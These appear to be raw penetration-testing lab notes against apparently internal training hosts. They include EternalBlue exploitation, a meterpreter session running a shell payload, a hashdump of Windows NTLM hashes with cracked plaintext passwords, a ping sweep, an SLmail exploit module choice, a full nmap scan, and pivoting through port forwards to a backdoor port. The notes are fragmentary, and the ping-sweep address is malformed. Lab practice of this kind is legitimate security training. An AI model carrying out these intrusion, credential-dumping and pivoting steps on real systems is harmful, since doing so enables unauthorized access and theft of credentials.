172.23.92.46
eternal blue
execute -f C:\\Windows\\Temp\\shell.exe

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ariel:1001:aad3b435b51404eeaad3b435b51404ee:01140dd085881340e3a968b51ff72e18:::
caliban:1000:aad3b435b51404eeaad3b435b51404ee:b8d70ed18b29cfdd50f5edaf1ca0c2c8:::
ferdinand:1002:aad3b435b51404eeaad3b435b51404ee:07eeb162d1cf775fc15ca27b19c7f395:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
miranda:1003:aad3b435b51404eeaad3b435b51404ee:4c78906b8f1e3122aefed1e25de2273f:::
prospero:1004:aad3b435b51404eeaad3b435b51404ee:e9ce4843e4b094b85e89b386d47c1f7f:::

31d6cfe0d16ae931b73c59d7e0c089c0:
4c78906b8f1e3122aefed1e25de2273f:bravenewworld
07eeb162d1cf775fc15ca27b19c7f395:slave2love
01140dd085881340e3a968b51ff72e18:loyal-beauty
e9ce4843e4b094b85e89b386d47c1f7f:exile0015
for i in {1..254} ;do (ping -c 1 192.168.131.0.$i | grep "bytes from" &) ;done
---
**172.23.92.41**
windows/pop3/seattlelab_pass
**172.23.92.42**
windows/pop3/seattlelab_pass

Nmap scan report for 172.23.92.41
Host is up (0.00028s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT      STATE SERVICE
25/tcp    open  smtp
79/tcp    open  finger
106/tcp   open  pop3pw
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

$ nmap -sV -A -sC 172.23.92.41
Starting Nmap 7.92 ( https://nmap.org ) at 2025-06-30 16:14 MDT
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 16:15 (0:00:26 remaining)
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 51.70% done; ETC: 16:16 (0:00:00 remaining)
Nmap scan report for 172.23.92.41
Host is up (0.00028s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
25/tcp    open  smtp               SLmail smtpd 5.5.0.4433
| smtp-commands: B1.com, SIZE 100000000, SEND, SOML, SAML, HELP, VRFY, EXPN, ETRN, XTRN
|_ This server supports the following commands. HELO MAIL RCPT DATA RSET SEND SOML SAML HELP NOOP QUIT
79/tcp    open  finger             SLMail fingerd
|_finger: Finger online user list request denied.\x0D
106/tcp   open  pop3pw             SLMail pop3pw
110/tcp   open  pop3               BVRP Software SLMAIL pop3d
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: B1
|   NetBIOS_Domain_Name: B1
|   NetBIOS_Computer_Name: B1
|   DNS_Domain_Name: B1
|   DNS_Computer_Name: B1
|   Product_Version: 6.1.7601
|_  System_Time: 2025-06-30T22:02:51+00:00
|_ssl-date: 2025-06-30T22:03:03+00:00; -13m35s from scanner time.
| ssl-cert: Subject: commonName=B1
| Not valid before: 2025-06-26T21:39:42
|_Not valid after:  2025-12-26T21:39:42
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
Service Info: Hosts: B1.com, B1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 58m24s, deviation: 2h41m00s, median: -13m36s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: B1
|   NetBIOS computer name: B1\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-06-30T16:02:52-06:00
|_nbstat: NetBIOS name: B1, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:3c:51:b1 (VMware)
| smb2-time:
|   date: 2025-06-30T22:02:51
|_  start_date: 2023-11-27T17:50:34




213 (Metasploitable2)
meterpreter > portfwd add -l 1524 -r 192.168.131.213 -p 1524
telnet 127.0.0.1 1524





interface portproxy add v4tov4 listenport=6721 listenaddress=172.23.92.63 connectport=21 connectaddress=192.168.131.46
